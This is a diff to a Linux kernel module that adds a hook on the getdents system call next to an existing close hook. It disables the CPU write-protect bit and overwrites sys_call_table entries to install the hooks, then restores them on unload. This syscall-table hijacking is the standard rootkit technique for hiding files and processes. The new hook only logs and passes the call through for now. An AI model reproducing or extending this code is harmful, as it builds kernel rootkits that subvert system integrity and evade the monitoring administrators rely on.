@@ -16,6 +16,13 @@ static void **ia32_sys_call_table;
 static struct task_struct *process, *prev_process, *next_process;
 static struct list_head *process_entry;
 
+asmlinkage long (*real_getdents)(struct pt_regs *);
+
+asmlinkage long fake_getdents(struct pt_regs *regs) {
+  printk(KERN_INFO "sys_getdents hooked");
+  return (*real_getdents)(regs);
+}
+
 asmlinkage long (*real_close)(struct pt_regs *);
 
 asmlinkage long fake_close(struct pt_regs *regs) {
@@ -91,8 +98,13 @@ static void hook_syscall(void) {
   }
 
   write_cr0(read_cr0() & ~0x10000);
+  
   real_close = sys_call_table[__NR_close];
   sys_call_table[__NR_close] = fake_close;
+  
+  real_getdents = sys_call_table[__NR_getdents];
+  sys_call_table[__NR_getdents] = fake_getdents;
+  
   write_cr0(read_cr0() | 0x10000);
 }
 
@@ -103,7 +115,10 @@ static void unhook_syscall(void) {
   }
 
   write_cr0(read_cr0() & ~0x10000);
+  
   sys_call_table[__NR_close] = real_close;
+  sys_call_table[__NR_getdents] = real_getdents;
+  
   write_cr0(read_cr0() | 0x10000);
 }
 
